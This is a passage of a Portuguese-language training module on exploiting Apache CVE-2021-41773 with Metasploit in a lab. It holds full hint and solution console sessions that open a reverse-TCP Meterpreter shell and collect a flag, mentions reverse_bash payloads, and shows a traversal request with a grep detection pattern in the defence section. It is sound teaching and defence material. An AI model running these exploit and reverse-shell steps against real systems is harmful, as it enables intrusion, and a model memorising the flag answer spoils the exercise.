+</Hint>
+
+<Hint title="Dica 2">
+`LHOST` é o **seu** endereço — o do Kali —, na rede que o alvo alcança. O Kali tem
+mais de uma interface; você quer a que está na mesma sub-rede do alvo. Descubra com
+`ip -4 -o addr show` e escolha o IP certo. (O Metasploit também aceita o nome da
+interface em `LHOST`, ex.: `set LHOST eth1`.)
+</Hint>
+
+<Solution title="Solução">
+Primeiro, ache o seu endereço na rede do lab. O Kali tem duas interfaces; a que
+importa é a que está na mesma sub-rede do alvo:
+
+```console
+$ ip -4 -o addr show | awk '{print $2, $4}'
+lo 127.0.0.1/8
+eth0 192.168.56.2/24     # rede do desktop (Guacamole) — não alcança o alvo
+eth1 192.168.0.2/24      # lab_net — mesma rede do alvo (192.168.0.10)
+```
+
+Agora configure tudo (o seu IP será o que apareceu em `eth1`, aqui `192.168.0.2`):
+
+```console
+msf6 exploit(multi/http/apache_normalize_path_rce) > set RHOSTS vulhub
+msf6 exploit(multi/http/apache_normalize_path_rce) > set RPORT 80
+msf6 exploit(multi/http/apache_normalize_path_rce) > set SSL false
+msf6 exploit(multi/http/apache_normalize_path_rce) > set CVE CVE-2021-41773
+msf6 exploit(multi/http/apache_normalize_path_rce) > set LHOST 192.168.0.2
+```
+
+Confira com `show options` que RHOSTS, RPORT 80, SSL false e LHOST estão certos.
+</Solution>
+
+### 5.4 Confirmar com `check` (guiado)
+
+Antes de disparar, confirme:
+
+```console
+msf6 exploit(multi/http/apache_normalize_path_rce) > check
+[*] Using auxiliary/scanner/http/apache_normalize_path as check
+[+] http://192.168.0.10:80 - The target is vulnerable to CVE-2021-41773 (mod_cgi is enabled).
+[+] 192.168.0.10:80 - The target is vulnerable.
+```
+
+Se veio `[+] ... is vulnerable`, pode seguir. Se viesse `[-]`, você teria economizado
+um ataque inútil — é para isso que o `check` serve.
+
+### 5.5 Desafio B — abrir a sessão e fingerprintar o serviço
+
+**Seu objetivo:** disparar o exploit, abrir a sessão Meterpreter e, **de dentro
+dela**, coletar os dois dados que montam a flag:
+
+- a **arquitetura** que o alvo reporta (o que `uname -m` devolve) — a primeira
+  parte;
+- os **12 primeiros caracteres** do SHA-256 do binário do Apache do alvo
+  (`/usr/local/apache2/bin/httpd`), calculado **no próprio alvo**, pela sessão — a
+  segunda parte.
+
+Por que a arquitetura? Porque é ela que decide o payload (um alvo `x86_64` casa com
+`linux/x64/...`); confirmar isso de dentro fecha o raciocínio da seção 2.3. E por
+que o binário? Porque ele não é servido pela web nem é legível pela traversal (o
+`/cgi-bin/` **executa**, não lê — relembre o 5.2): só com uma sessão de verdade você
+tira a impressão digital do serviço.
+
+<Hint title="Dica 1">
+`exploit` dispara. Quando a sessão abrir, o prompt vira `meterpreter >`. Comece
+reconhecendo o terreno: `sysinfo` e `getuid` são comandos do próprio Meterpreter.
+</Hint>
+
+<Hint title="Dica 2">
+O Meterpreter não é um shell do Linux — `uname` e `sha256sum` são comandos do
+sistema. Caia num shell com o comando `shell` (e saia dele com `exit`, voltando ao
+Meterpreter), ou, mais prático, rode um comando de shell direto na sessão, do
+prompt do msf, com `sessions -c 'COMANDO' -i 1`.
+</Hint>
+
+<Solution title="Solução">
+Dispare e observe a conexão reversa abrir a sessão:
+
+```console
+msf6 exploit(multi/http/apache_normalize_path_rce) > exploit
+[*] Started reverse TCP handler on 192.168.0.2:4444
+[+] http://192.168.0.10:80 - The target is vulnerable to CVE-2021-41773 (mod_cgi is enabled).
+[*] http://192.168.0.10:80 - Sending linux/x64/meterpreter/reverse_tcp command payload
+[*] Sending stage (3106788 bytes) to 192.168.0.10
+[*] Meterpreter session 1 opened (192.168.0.2:4444 -> 192.168.0.10:49124)
+[!] This exploit may require manual cleanup of '/tmp/KxPD' on the target
+
+meterpreter > sysinfo
+Computer     : vulhub.localdomain
+OS           : Debian 10.10 (Linux 5.10.0-19-amd64)
+Architecture : x64
+Meterpreter  : x64/linux
+meterpreter > getuid
+Server username: daemon
+```
+
+Você está dentro, como `daemon`. Agora os dois dados da flag. O Meterpreter não tem
+`uname` nem `sha256sum` (são comandos do sistema), então mande-os pela sessão. Do
+prompt do msf (mande a sessão para segundo plano com `background`, ou abra outro):
+
+```console
+msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -c 'uname -m' -i 1
+[*] Running 'uname -m' on meterpreter session 1 (192.168.0.10)
+x86_64
+msf6 exploit(multi/http/apache_normalize_path_rce) > sessions -c 'sha256sum /usr/local/apache2/bin/httpd' -i 1
+[*] Running 'sha256sum /usr/local/apache2/bin/httpd' on meterpreter session 1 (192.168.0.10)
+3787557f9f5f87809f0a6b6b0465408243613d8be4c4e8a89e136065462db499  /usr/local/apache2/bin/httpd
+```
+
+A arquitetura é `x86_64`; os 12 primeiros caracteres do hash são `3787557f9f5f`.
+Monte `FLAG{arch-hash}` com as duas partes.
+</Solution>
+
+Junte a arquitetura e o início do hash no formato `FLAG{arch-hash}` e valide:
+
+<FlagInput task="obter-sessao" />
+
+### 5.6 Desligar o laboratório
+
+No painel **Laboratório**, clique em **Parar** (libera a vaga do único lab ativo).
+Use **Resetar** para refazer do zero — o alvo volta ao estado de fábrica, limpando
+inclusive o artefato que o exploit deixou em `/tmp`. Pela linha de comando:
+`scripts/lab.sh down vulhub`.
+
+## 6. Variações e aprofundamento
+
+- **Detectar sem explorar (o módulo `auxiliary`).** Nem sempre você quer disparar o
+  exploit — às vezes só precisa confirmar, em escala, quem é vulnerável. O módulo
+  scanner faz isso. A ação `CHECK_RCE` confirma a condição de RCE sem abrir sessão:
+
+  ```console
+  msf6 > use auxiliary/scanner/http/apache_normalize_path
+  msf6 auxiliary(scanner/http/apache_normalize_path) > set RHOSTS vulhub
+  msf6 auxiliary(scanner/http/apache_normalize_path) > set RPORT 80
+  msf6 auxiliary(scanner/http/apache_normalize_path) > set SSL false
+  msf6 auxiliary(scanner/http/apache_normalize_path) > set CVE CVE-2021-41773
+  msf6 auxiliary(scanner/http/apache_normalize_path) > set ACTION CHECK_RCE
+  msf6 auxiliary(scanner/http/apache_normalize_path) > run
+  [+] http://192.168.0.10:80 - The target is vulnerable to CVE-2021-41773 (mod_cgi is enabled).
+  ```
+
+  O mesmo scanner tem uma ação `READ_FILE` (lê arquivos pela traversal, quando o
+  alvo não força execução) e detecta também a variante por dupla codificação
+  (CVE-2021-42013) — o `RHOSTS` aceita uma lista ou um arquivo, então um scanner
+  desses varre uma rede inteira. É o elo com o 5.1.
+
+- **Escolher outro payload.** O padrão é o Meterpreter em estágios, mas você pode
+  trocar: `set payload cmd/unix/reverse_bash` dá um shell cru e leve (bom quando o
+  Meterpreter não sobe); `show payloads` lista os compatíveis com o exploit. A
+  arquitetura tem de casar — foi por isso que você confirmou `x86_64` na sessão.
+
+- **Gerar payloads fora do console: o msfvenom.** Quando o acesso não vem de um
+  exploit do Metasploit (um upload de arquivo, um comando que você já executa de
+  outro jeito), o <GlossaryTerm term="msfvenom">msfvenom</GlossaryTerm> gera o
+  payload avulso — um executável, um script, um *one-liner* — que você entrega por
+  esse outro caminho, e o recebe com um handler (`exploit/multi/handler`). É a ponte
+  entre o Metasploit e o mundo "na unha" dos módulos 5.2 e 2.7.
+
+- **Automatizar com `resource scripts`.** Uma sequência de comandos pode virar um
+  arquivo `.rc` rodado com `msfconsole -r`, útil para repetir um teste de forma
+  idêntica e documentável — a mesma ideia de reprodutibilidade do Vulhub (5.4).
+
+## 7. Erros comuns
+
+- **"A sessão nunca abre / fica em `Sending stage` para sempre."** Quase sempre o
+  `LHOST` está errado: apontado para `127.0.0.1` ou para a interface que o alvo não
+  alcança. O alvo liga de volta para o `LHOST`; se não for o seu IP na rede dele, a
+  conexão reversa se perde. Confira com `ip addr` e refaça o `set LHOST`.
+- **"`Exploit completed, but no session was created`."** O exploit rodou, mas o
+  payload não voltou. Além do `LHOST`, verifique se o payload é compatível com a
+  arquitetura do alvo e se nada bloqueia a porta do handler (`LPORT`). Rode o
+  `check` de novo para garantir que o alvo ainda está vulnerável.
+- **"Dei `set` mas o valor não pegou."** Você setou com o módulo errado
+  selecionado, ou escreveu o nome da opção torto. `show options` é a fonte da
+  verdade: ele mostra o `Current Setting` de cada uma.
+- **"`uname`/`sha256sum` não funcionam no `meterpreter >`."** O Meterpreter tem os
+  comandos **dele** (`sysinfo`, `getuid`, `download`...), não os do Linux. Para os
+  do sistema, caia num `shell` ou use `sessions -c 'comando'`.
+- **"O `search` não acha nada / está lento."** Dbless, o `search` usa o cache local
+  de módulos; na primeira busca ele pode demorar a montar o cache. Se um nome não
+  aparece, confira a grafia (`search cve:2021-41773`, `search apache`).
+- **"Esperava ser root."** A sessão roda como `daemon` — a conta do serviço. O
+  Metasploit te dá acesso, não privilégio: virar root é escalação (Trilha 6).
+
+## 8. Defesa e mitigação
+
+O Metasploit é uma ferramenta ofensiva, mas pensá-lo pelo lado da defesa é o que
+fecha a visão completa — e é assim que *blue teams* o usam: para validar se as suas
+defesas pegam um ataque real e repetível.
+
+**1. O exploit em si corrige-se como qualquer CVE.** O ataque do lab é a
+CVE-2021-41773; a defesa é a mesma do 5.4 — atualizar o Apache para 2.4.51+,
+fechar o acesso ao sistema de arquivos (`Require all denied`) e desligar o CGI se
+não for usado. O Metasploit não cria vulnerabilidade: ele explora a que já existe.
+Tirar a vulnerabilidade tira o poder da ferramenta.
+
+**2. Detecte o payload e a conexão reversa.** O que o Metasploit faz deixa rastro,
+e a defesa mira nesses rastros:
+
+- **No host:** o exploit da CVE deixou um artefato em `/tmp` (o aviso de
+  "manual cleanup"), e o Meterpreter roda dentro de um processo do servidor web que
+  **de repente abre uma conexão de saída** — um servidor web que conecta para fora,
+  numa porta alta, é anômalo. Monitoração de processos e de integridade de arquivos
+  (FIM) pega isso.
+- **Na rede:** a conexão reversa vai do alvo para o atacante numa porta
+  não-padrão (4444 é o default clássico do Metasploit — tão clássico que vale
+  alertar sobre ela). *Egress filtering* (restringir o que pode sair da rede)
+  mata a reverse shell: se o servidor web só pode falar nas portas que precisa,
+  o payload não tem para onde ligar de volta.
+
+**3. Assinaturas de IDS/IPS e EDR.** O stager e o tráfego do Meterpreter têm
+padrões que um <GlossaryTerm term="IDS">IDS</GlossaryTerm> como o Suricata
+reconhece (há regras públicas para payloads do Metasploit), e um EDR moderno
+detecta a injeção em memória e o comportamento do agente. Veja o exemplo no log do
+Apache, onde a requisição do exploit é inconfundível:
+
+```console
+$ grep -E '/cgi-bin/\.%2e|%2e%2e|/bin/sh' /usr/local/apache2/logs/access_log
+192.168.0.2 - - [20/Oct/2026:11:53:50 +0000] "POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1" 200
+```
+
+O IP de origem (`192.168.0.2`) é o do atacante; o padrão da URL é o mesmo do ataque
+na unha (5.2), porque o Metasploit faz, por baixo, a **mesma** requisição. Ou seja:
+quem detecta o ataque manual detecta o do Metasploit — a ferramenta não torna o
+ataque invisível, só mais rápido.
+
+**4. Reduza a superfície.** O caso BlueKeep (seção 4) é a lição em estado puro: o
+RDP jamais deveria estar exposto à internet. Serviço que não precisa estar
+acessível, não fica acessível; o que precisa, fica atrás de VPN, com patch em dia e
+sob monitoração. Um módulo do Metasploit só é perigoso contra um alvo que reúne as
+condições — tire uma condição e o `exploit` devolve `no session`.
+
+## 9. Exercícios
+
+O desafio principal é o laboratório da seção 5 (a flag `FLAG{arch-hash}`): abrir a
+sessão Meterpreter e fingerprintar o serviço de dentro dela. Além disso, responda ao
+quiz — ele cobra o *porquê* da mecânica (a diferença exploit/payload, o sentido da
+conexão reversa, o que o `check` faz, o significado de `daemon`), não a decoreba dos
+comandos.
+
+<Quiz task="quiz-final" />
+
+**Exercício prático (opcional, sem flag).** Com o lab de pé, use o módulo
+`auxiliary/scanner/http/apache_normalize_path` com a ação `READ_FILE` para tentar
+**ler** um arquivo do alvo (em vez de executar). Compare o resultado com o RCE: por
+que, neste alvo, ler pela traversal é mais difícil do que executar? (Dica: releia o
+papel do `ScriptAlias /cgi-bin/` no 5.2 — o caminho mapeado para fora da raiz
+**executa**.) Depois, troque o payload para `cmd/unix/reverse_bash` e abra a sessão
+de novo: o que muda no tipo de sessão que você recebe?
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- O Metasploit organiza a exploração **separando a falha (exploit) do que se faz
+  com ela (payload)**. Essa única ideia é o que dá reúso e escala; os seis tipos de
+  módulo (exploit, payload, auxiliary, post, encoder, nop) giram em torno dela.
+- O fluxo é sempre `search → use → set → check → exploit`. O `datastore` guarda a
+  configuração (`set`); o `check` confirma antes de disparar; o `exploit` abre uma
+  `session`.
+- Num payload **reverso**, o alvo liga de volta para você: `LHOST` é o **seu**
+  endereço na rede do alvo, não o do alvo nem `127.0.0.1`. Errar isso é o motivo nº
+  1 de "a sessão não abre".
+- O **Meterpreter** é um agente em memória, poderoso e furtivo, mas volátil. Ele
+  não é um shell do Linux: tem comandos próprios (`sysinfo`, `getuid`).
+- A ferramenta **não dá privilégio**: você herda a conta do serviço (`daemon`).
+  Acesso não é controle total — escalar é a Trilha 6.
+- Defesa: o Metasploit faz, por baixo, a **mesma** requisição do ataque manual, com
+  o mesmo rastro nos logs. Patch, *egress filtering*, IDS/EDR e redução de
+  superfície valem contra ele como contra qualquer ataque.
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [Metasploit Unleashed (OffSec)](https://www.offsec.com/metasploit-unleashed/) — o curso aberto e gratuito, referência de fluxo e comandos do framework.
+- [Documentação oficial do Metasploit (Rapid7)](https://docs.metasploit.com/) — módulos, payloads, Meterpreter e o uso do banco/workspaces.
+- [Rapid7 — Initial Metasploit Exploit Module for BlueKeep](https://www.rapid7.com/blog/post/2019/09/06/initial-metasploit-exploit-module-for-bluekeep-cve-2019-0708/) — o anúncio do módulo do caso da seção 4.
+- [MITRE ATT&CK — T1210 Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/) — a técnica que o Metasploit automatiza, catalogada.
